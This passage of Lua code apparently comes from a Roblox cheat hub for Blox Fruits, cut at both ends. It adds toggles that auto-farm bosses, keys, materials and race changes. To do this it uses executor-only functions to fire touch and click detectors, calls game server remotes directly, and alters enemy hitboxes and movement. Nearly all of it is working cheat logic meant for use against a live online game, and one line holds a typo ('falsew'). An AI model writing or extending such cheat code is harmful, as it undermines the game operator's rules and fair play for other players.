                                        toPoint(PlatesPosition)
                                    until getDistance(PlatesPosition) < 20
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate1
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate2
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate3
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate4
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate5
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate6
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate7
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate8
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                            end
                        end 
                    end)
                end
            end)

            AutoSea3Toggle = Sea2ItemsSection:NewToggle("Auto Open Sea 3", function(state)
                getgenv().EuphoriaSettings["Auto Open Sea 3"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Open Sea 3"] then AutoSea3Toggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Open Sea 3"] then AutoSea3 = true else AutoSea3 = false end
                    end)
                end
            end)

            spawn(function()
                while wait() do
                    pcall(function()
                        if AutoSea3 and LP.Data.Level.Value >= 1500 and second_sea then
                            if game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ZQuestProgress", "Zou") ~= 0 then
                                if not ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates then
                                    AutoSea3Bartilo = true
                                else
                                    AutoSea3Bartilo = false 
                                    Unlockables = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GetUnlockables")
                                    if not Unlockables.FlamingoAccess then
                                        fruitUnused = getUnusable1MFruit()
                                        if fruitUnused then
                                            storeAllFruits()
                                            wait(.2)
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("LoadFruit", fruitUnused)
                                            wait(.1)
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TalkTrevor","1")
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TalkTrevor","2")
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TalkTrevor","3")
                                        else
                                            notis.new("<Color=Red>Need to get 1M Unusable fruit!<Color=/>"):Display()
                                        end
                                    elseif not Unlockables.SwanShip then
                                        AutoSea3DonSwan = true
                                        AutoSea3DonSwanHop = true
                                    else
                                        AutoSea3DonSwan = true
                                        AutoSea3DonSwanHop = true
                                        if not game:GetService("Workspace").Enemies:FindFirstChild("rip_indra") then
                                            game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ZQuestProgress", "Begin")
                                        else
                                            v = game:GetService("Workspace").Enemies:FindFirstChild("rip_indra")
                                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                                repeat wait()
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                    v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                    v.HumanoidRootPart.CanCollide = false
                                                    v.Humanoid.WalkSpeed = 0
                                                    v.Head.CanCollide = false
                                                    BringMobFarm = false
                                                    EquipWeapon(_G.SelectWeapon)
                                                    v.HumanoidRootPart.Transparency = 1
                                                    useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    game.ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                                until not AutoSea3 or v.Humanoid.Health <= 0 or not v.Parent
                                                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                            end
                                        end
                                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                    end
                                end
                            else
                                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                            end
                        else
                            AutoSea3Bartilo = false
                            AutoSea3DonSwan = false
                            AutoSea3DonSwanHop = false 
                        end
                    end)
                end
            end)



            AutoFactory = Sea2ItemsSection:NewToggle("Auto Factory", function(state)
                getgenv().EuphoriaSettings["Auto Factory"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Factory"] then AutoFactory:UpdateToggle(nil, true) end
            AutoFactoryHop = Sea2ItemsSection:NewToggle("Auto Factory Hop [Farm only boss then]", function(state)
                getgenv().EuphoriaSettings["Auto Factory Hop"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Factory Hop"] then AutoFactoryHop:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewLabel(" ")
            -- =====
            -- Darkbeard
            AutoKillDarkbeard = Sea2ItemsSection:NewToggle("Auto Kill Darkbeard", function(state)
                getgenv().EuphoriaSettings["Auto Kill Darkbeard"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Kill Darkbeard"] then AutoKillDarkbeard:UpdateToggle(nil, true) end
            AutoKillDarkbeard = Sea2ItemsSection:NewButton("Spawn Darkbeard", function()
                if isItemInEquip("Fist of Darkness") then
                    firetouchinterest(LP.Character.HumanoidRootPart, workspace.Map.DarkbeardArena.Summoner.Detection, 0)
                    wait()
                    firetouchinterest(LP.Character.HumanoidRootPart, workspace.Map.DarkbeardArena.Summoner.Detection, 1)
                end
            end)
            
            Sea2ItemsSection:NewLabel(" ")
            -- =====
            -- Cursed Captain
            AutoGhoulRace = Sea2ItemsSection:NewToggle("Auto Ghoul Race", function(state)
                getgenv().EuphoriaSettings["Auto Ghoul Race"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Ghoul Race"] then AutoGhoulRace:UpdateToggle(nil, true) end
            AutoGhoulRaceHop = Sea2ItemsSection:NewToggle("Auto Ghoul Race Hop", function(state)
                getgenv().EuphoriaSettings["Auto Ghoul Race Hop"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Ghoul Race Hop"] then AutoGhoulRaceHop:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewLabel(" ")
            -- =====

            AutoRengoku = Sea2ItemsSection:NewToggle("Auto Rengoku", function(state)
                getgenv().EuphoriaSettings["Auto Rengoku"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Rengoku"] then AutoRengoku:UpdateToggle(nil, true) end
            AutoRengokuHop = Sea2ItemsSection:NewToggle("Auto Rengoku Hop [Farm only boss then]", function(state)
                getgenv().EuphoriaSettings["Auto Rengoku Hop"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Rengoku Hop"] then AutoRengokuHop:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewLabel(" ")

            AutoKillTideKeeper = Sea2ItemsSection:NewToggle("Farm Water Key", function(state)
                getgenv().EuphoriaSettings["Farm Water Key"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Farm Water Key"] then AutoKillTideKeeper:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Farm Water Key"] then FarmWaterKey = true else FarmWaterKey = false end
                    end)
                end
            end)
            AutoKillTideKeeperHop = Sea2ItemsSection:NewToggle("Farm Water Key Hop", function(state)
                getgenv().EuphoriaSettings["Farm Water Key Hop"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Farm Water Key Hop"] then AutoKillTideKeeperHop:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Farm Water Key Hop"] then FarmWaterKeyHop = true else FarmWaterKeyHop = false end
                    end)
                end
            end)

            FarmLibraryKeyToggle = Sea2ItemsSection:NewToggle("Farm Library Key", function(state)
                getgenv().EuphoriaSettings["Farm Library Key"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Farm Library Key"] then FarmLibraryKeyToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Farm Library Key"] then FarmLibraryKey = true else FarmLibraryKey = false end
                    end)
                end
            end)
            FarmLibraryKeyHopToggle = Sea2ItemsSection:NewToggle("Farm Library Key Hop", function(state)
                getgenv().EuphoriaSettings["Farm Library Key Hop"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Farm Library Key Hop"] then FarmLibraryKeyHopToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Farm Library Key Hop"] then FarmLibraryKeyHop = true else FarmLibraryKeyHop = false end
                    end)
                end
            end)

            Sea2ItemsSection:NewLabel(" ")

            AutoSwanGlasses = Sea2ItemsSection:NewToggle("Swan Glasses [Must Be Swan Room Opened]", function(state)
                getgenv().EuphoriaSettings["Swan Glasses"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Swan Glasses"] then AutoSwanGlasses:UpdateToggle(nil, true) end
            AutoSwanGlassesHop = Sea2ItemsSection:NewToggle("Swan Glasses Hop", function(state)
                getgenv().EuphoriaSettings["Swan Glasses Hop"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Swan Glasses Hop"] then AutoSwanGlassesHop:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewLabel(" ")

            AutoGravityCane = Sea2ItemsSection:NewToggle("Auto Gravity Cane", function(state)
                getgenv().EuphoriaSettings["Gravity Cane"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Gravity Cane"] then AutoGravityCane:UpdateToggle(nil, true) end
            AutoGravityCaneHop = Sea2ItemsSection:NewToggle("Auto Gravity Cane Hop", function(state)
                getgenv().EuphoriaSettings["Gravity Cane Hop"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Gravity Cane Hop"] then AutoGravityCaneHop:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewLabel(" ")

            Sea2ItemsSection:NewLabel("Farm Koko / Cyborg")
            Sea2ItemsSection:NewToggle("Auto Kill Order", function(state)
                _G.AutoKillOrder = state
            end)
            Sea2ItemsSection:NewToggle("Auto Buy Order chip", function(state)
                _G.AutoBuyOrderChip = state
            end)
            autostartorder1 = Sea2ItemsSection:NewToggle("Auto Start Order", function(state)
                if autostartorder2 and state then autostartorder2:UpdateToggle(nil, false) end
                getgenv().EuphoriaSettings['AutoStartOrder'] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings['AutoStartOrder'] then autostartorder1:UpdateToggle(nil, true) end
            _G.TeammatesForStart = 1
            autostartorder2 = Sea2ItemsSection:NewToggle("Auto Start Order With Teammates", function(state)
                if autostartorder1 and state then autostartorder1:UpdateToggle(nil, false) end
                getgenv().EuphoriaSettings['AutoStartOrderWithTeammates'] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings['AutoStartOrderWithTeammates'] then autostartorder2:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewSlider("Min. Teammates", 1, 4, function(count)
                _G.TeammatesForStart = count
            end)
            AutoCyborgTeammate = Sea2ItemsSection:NewToggle("Auto Cyborg Race [ Self Mode ]", function(state)
                getgenv().EuphoriaSettings['Auto Cyborg Race Self'] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings['Auto Cyborg Race Self'] then AutoCyborgTeammate:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings['Auto Cyborg Race Self'] then
                            _G.AutoCyborgRaceSelf = true
                        else
                            _G.AutoCyborgRaceSelf = false
                        end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    local s, e = pcall(function()
                        if _G.AutoCyborgRaceSelf and LP.Data.Race.Value ~= "Cyborg" then
                            if workspace.Map.CircleIsland:FindFirstChild("BlockPart") and workspace.Map.CircleIsland:FindFirstChild("BlockPart").CanCollide then
                                if isItemInEquip("Core Brain") then
                                    fireclickdetector(game:GetService("Workspace").Map.CircleIsland.RaidSummon.Button.Main.ClickDetector) 
                                else
                                    if not isItemInEquip("Microchip") and not game:GetService("Workspace").Enemies:FindFirstChild("Order") then 
                                        if not game:GetService("Workspace").Enemies:FindFirstChild("Order") then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "Microchip", "2")
                                        end
                                    else
                                        fireclickdetector(game:GetService("Workspace").Map.CircleIsland.RaidSummon.Button.Main.ClickDetector) 
                                    end
                                    v = game:GetService("Workspace").Enemies:FindFirstChild("Order")
                                    if v and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                        repeat task.wait()
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Head.CanCollide = falsew
                                            BringMobFarm = false
                                            EquipWeapon(_G.SelectWeapon)
                                            v.HumanoidRootPart.Transparency = 1
                                            if getDistance(v.HumanoidRootPart.CFrame) > 1000 then
                                                useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            end
                                            toTarget(CFrame.new(v.HumanoidRootPart.Position) * OffsetCFrame())
                                        until not _G.AutoCyborgRaceSelf or v.Humanoid.Health <= 0 or not v.Parent
                                    end
                                end
                            else                  
                                if LP.Data.Fragments.Value < 2500 then
                                    notis.new("<Color=Yellow>Not enough fragments!<Color=/>"):Display()
                                end              
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CyborgTrainer", "Check")
                                wait()
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CyborgTrainer", "Buy")
                                wait()
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CyborgTrainer", "Change")
                            end
                        end
                    end)
                    if e then print(e) end
                end
            end)
            AutoCyborgTeammate = Sea2ItemsSection:NewToggle("Auto Cyborg Race [ Teammate Mode ]", function(state)
                getgenv().EuphoriaSettings['Auto Cyborg Race Teammate'] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings['Auto Cyborg Race Teammate'] then AutoCyborgTeammate:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings['Auto Cyborg Race Teammate'] then
                            _G.AutoCyborgRaceTeammate = true
                        else
                            _G.AutoCyborgRaceTeammate = false
                        end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    local s, e = pcall(function()
                        if _G.AutoCyborgRaceTeammate and LP.Data.Race.Value ~= "Cyborg" then
                            if workspace.Map.CircleIsland:FindFirstChild("BlockPart") and workspace.Map.CircleIsland:FindFirstChild("BlockPart").CanCollide then
                                if isItemInEquip("Core Brain") then
                                    fireclickdetector(game:GetService("Workspace").Map.CircleIsland.RaidSummon.Button.Main.ClickDetector) 
                                else
                                    v = game:GetService("Workspace").Enemies:FindFirstChild("Order")
                                    if v and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                        repeat task.wait()
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Head.CanCollide = falsew
                                            BringMobFarm = false
                                            EquipWeapon(_G.SelectWeapon)
                                            v.HumanoidRootPart.Transparency = 1
                                            if getDistance(v.HumanoidRootPart.CFrame) > 1000 then
                                                useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            end
                                            toTarget(CFrame.new(v.HumanoidRootPart.Position) * OffsetCFrame())
                                        until not _G.AutoCyborgRaceTeammate or v.Humanoid.Health <= 0 or not v.Parent
                                    else
                                        cf = _G.CellCFrame
                                        if useNearestEntrance(cf) then
                                            StopTween()
                                        end
                                        toPoint(cf)  
                                    end
                                end
                            else                  
                                if LP.Data.Fragments.Value < 2500 then
                                    notis.new("<Color=Yellow>Not enough fragments!<Color=/>"):Display()
                                end              
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CyborgTrainer", "Check")
                                wait()
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CyborgTrainer", "Buy")
                                wait()
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CyborgTrainer", "Change")
                            end
                        end
                    end)
                    if e then print(e) end
                end
            end)

            Sea2ItemsSection:NewButton("Tween to teammate cell", function()
                if second_sea then
                    cf = _G.CellCFrame
                    StoppedTween = false
                    repeat wait()
                        NoClip = true
                        useNearestEntrance(cf)
                        toPoint(cf)
                    until (LP.Character.HumanoidRootPart.CFrame.Position - cf.Position).Magnitude < 20 or StoppedTween
                    NoClip = false
                end
            end)
            TeammateCellDropdown = Sea2ItemsSection:NewDropdown("Teammate Cell", {"1", "2", "3", "4"}, function(selected)
                cframes = {
                    ["1"] = CFrame.new(-5577.11084, 337.279449, -5879.2207, -0.852391958, 0, 0.522903383, 0, 1, 0, -0.522903383, 0, -0.852391958),
                    ["2"] = CFrame.new(-5582.35498, 337.279358, -5893.75098, 0.930309832, 0, 0.366774619, 0, 1, 0, -0.366774619, 0, 0.930309832),
                    ["3"] = CFrame.new(-5586.23096, 337.279358, -5906.05566, 0.955127656, 0, 0.296194464, 0, 1, 0, -0.296194464, 0, 0.955127656),
                    ["4"] = CFrame.new(-5590.30762, 337.279358, -5920.48975, 0.965189993, 0, 0.26154986, 0, 1, 0, -0.26154986, 0, 0.965189993),
                }
                _G.CellCFrame = cframes[selected]
                getgenv().EuphoriaSettings["Teammate Cell"] = selected
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Teammate Cell"] then
                TeammateCellDropdown:UpdateSelect(getgenv().EuphoriaSettings["Teammate Cell"])
            else
                TeammateCellDropdown:UpdateSelect("1")
            end
        end

        spawn(function()
            while task.wait() do
                pcall(function()
                    if _G.AutoKillOrder and second_sea and game:GetService("Workspace").Enemies:FindFirstChild("Order") and game:GetService("Workspace").Enemies:FindFirstChild("Order"):FindFirstChild('Humanoid') and game:GetService("Workspace").Enemies:FindFirstChild("Order").Humanoid.Health > 0 then
                        _G.KillingOrder = true
                    else
                        _G.KillingOrder = false
                    end
                end)
            end
        end)

        spawn(function()
            while task.wait() do
                pcall(function()
                    if _G.KillingOrder then
                        _G.MarkedAsKillingOrder = true
                        v = game:GetService("Workspace").Enemies:FindFirstChild("Order")
                        if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                            repeat task.wait()
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                v.HumanoidRootPart.CanCollide = false
                                v.Humanoid.WalkSpeed = 0
                                v.Head.CanCollide = false
                                BringMobFarm = false
                                EquipWeapon(_G.SelectWeapon)
                                v.HumanoidRootPart.Transparency = 1
                                if getDistance(v.HumanoidRootPart.CFrame) > 1000 then
                                    useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                end
                                toTarget(CFrame.new(v.HumanoidRootPart.Position) * OffsetCFrame())
                            until not _G.AutoKillOrder or not _G.KillingOrder or v.Humanoid.Health <= 0 or not v.Parent
                        end
                    else
                        if _G.MarkedAsKillingOrder then
                            toPoint(CFrame.new(game.Players.LocalPlayer.HumanoidRootPart.Position) * CFrame.new(0,60,0))
                            _G.MarkedAsKillingOrder = false
                        end
                    end
                end)
            end
        end)

        spawn(function()
            while wait() do
                wait(2)
                s1, e1 = pcall(function()
                    if _G.AutoBuyOrderChip then
                        if not isItemInEquip("Microchip") then 
                            if not game:GetService("Workspace").Enemies:FindFirstChild("Order") then
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "Microchip", "2")
                            end
                        end
                    end
                end)
                if e1 then print(e1) end
            end
        end)

        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings['AutoStartOrder'] then
                        if isItemInEquip("Microchip") or isItemInEquip("Fist of Darkness") or isItemInEquip("Core Brain") then
                            if not game:GetService("Workspace").Enemies:FindFirstChild("Order") then
                                print("Trying to start raid")
                                fireclickdetector(game:GetService("Workspace").Map.CircleIsland.RaidSummon.Button.Main.ClickDetector) 
                            end
                        end
                    elseif getgenv().EuphoriaSettings['AutoStartOrderWithTeammates'] then
                        if isItemInEquip("Microchip") and not game:GetService("Workspace").Enemies:FindFirstChild("Order") then
                            count = 0
                            if game:GetService("Workspace").Map.CircleIsland.RaidSummon.Raid1.Color.BrickColor == BrickColor.new("Lime green") then
                                count = count + 1
                            end
                            if game:GetService("Workspace").Map.CircleIsland.RaidSummon.Raid2.Color.BrickColor == BrickColor.new("Lime green") then
                                count = count + 1
                            end
                            if game:GetService("Workspace").Map.CircleIsland.RaidSummon.Raid3.Color.BrickColor == BrickColor.new("Lime green") then
                                count = count + 1
                            end
                            if game:GetService("Workspace").Map.CircleIsland.RaidSummon.Raid4.Color.BrickColor == BrickColor.new("Lime green") then
                                count = count + 1
                            end
                            if count >= _G.TeammatesForStart then 
                                print("Trying to start raid")
                                fireclickdetector(game:GetService("Workspace").Map.CircleIsland.RaidSummon.Button.Main.ClickDetector) 
                            end
                        end
                    end
                end)
            end
        end)


        if third_sea then
            local Sea3ItemsSection = FarmTab:NewSection("Sea 3 Items")
            local Sea3MaterialsSection = FarmTab:NewSection("Sea 3 Materials")
            FarmCocoa = Sea3MaterialsSection:NewToggle("Farm Conjured Cocoa", function(state)
                getgenv().EuphoriaSettings["Farm Conjured Cocoa"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Farm Conjured Cocoa"] then FarmCocoa:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Farm Conjured Cocoa"] then _G.FarmCocoa = true else _G.FarmCocoa = false end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    if _G.FarmCocoa and third_sea then
                        pcall(function()
                            if game:GetService("Workspace").Enemies:FindFirstChild("Chocolate Bar Battler") or game:GetService("Workspace").Enemies:FindFirstChild("Candy Rebel") or game:GetService("Workspace").Enemies:FindFirstChild("Cocoa Warrior") or game:GetService("Workspace").Enemies:FindFirstChild("Sweet Thief") then
                                target = getClosest({"Chocolate Bar Battler", "Candy Rebel", "Cocoa Warrior", "Sweet Thief"})
                                if target then
                                    v = target
                                    if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                        repeat task.wait()
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Head.CanCollide = false
                                            BringMobFarm = true
                                            PosMon = v.HumanoidRootPart.CFrame
                                            EquipWeapon(_G.SelectWeapon)
                                            v.HumanoidRootPart.Transparency = 1
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        until not _G.FarmCocoa or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                end
                            elseif ReplicatedStorage:FindFirstChild("Chocolate Bar Battler") or ReplicatedStorage:FindFirstChild("Candy Rebel") or ReplicatedStorage:FindFirstChild("Cocoa Warrior") or ReplicatedStorage:FindFirstChild("Sweet Thief") then
                                target = getClosest({"Chocolate Bar Battler", "Candy Rebel", "Cocoa Warrior", "Sweet Thief"})
                                if target then
                                    v = target
                                    if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                        repeat task.wait()
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Head.CanCollide = false
                                            BringMobFarm = true
                                            PosMon = v.HumanoidRootPart.CFrame
                                            EquipWeapon(_G.SelectWeapon)
                                            v.HumanoidRootPart.Transparency = 1
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        until not _G.FarmCocoa or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                end
                            else
                                pos = CFrame.new(264.833435, 43.5868988, -12724.9033, -0.524356186, 8.38680876e-08, 0.851499021, 1.12196048e-07, 1, -2.94039033e-08, -0.851499021, 8.01167062e-08, -0.524356186)
                                useNearestEntrance(pos)
                                toPoint(pos)
                            end
                        end)
                    end
                end
            end) 
            FarmDragonScale = Sea3MaterialsSection:NewToggle("Farm Dragon Scale", function(state)
                getgenv().EuphoriaSettings["Farm Dragon Scale"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Farm Dragon Scale"] then FarmDragonScale:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Farm Dragon Scale"] then _G.FarmDragonScale = true else _G.FarmDragonScale = false end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    if _G.FarmDragonScale and third_sea then
                        pcall(function()
                            if game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Archer") or game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Warrior") then
                                target = getClosest({"Dragon Crew Warrior", "Dragon Crew Archer"})
                                if target then
                                    v = target
                                    if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                        repeat task.wait()
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Head.CanCollide = false
                                            BringMobFarm = true
                                            PosMon = v.HumanoidRootPart.CFrame
                                            EquipWeapon(_G.SelectWeapon)
                                            v.HumanoidRootPart.Transparency = 1
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        until not _G.FarmDragonScale or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                end
                            elseif ReplicatedStorage:FindFirstChild("Dragon Crew Archer") or ReplicatedStorage:FindFirstChild("Dragon Crew Warrior") then
                                target = getClosest({"Dragon Crew Warrior", "Dragon Crew Archer"})
                                if target then
                                    v = target
                                    if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                        repeat task.wait()
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Head.CanCollide = false
                                            BringMobFarm = true
                                            PosMon = v.HumanoidRootPart.CFrame
                                            EquipWeapon(_G.SelectWeapon)
                                            v.HumanoidRootPart.Transparency = 1
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        until not _G.FarmDragonScale or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                end
                            else
                                for i,v in pairs(workspace._WorldOrigin.EnemySpawns:GetChildren()) do
                                    if string.find(v.Name, "Dragon Crew Warrior") or string.find(v.Name, "Dragon Crew Archer") then
                                        if getDistance(v.CFrame) > 500 then
                                            repeat wait()
                                                useNearestEntrance(v.CFrame * CFrame.new(0,50,0))
                                                toPoint(v.CFrame * CFrame.new(0,50,0))
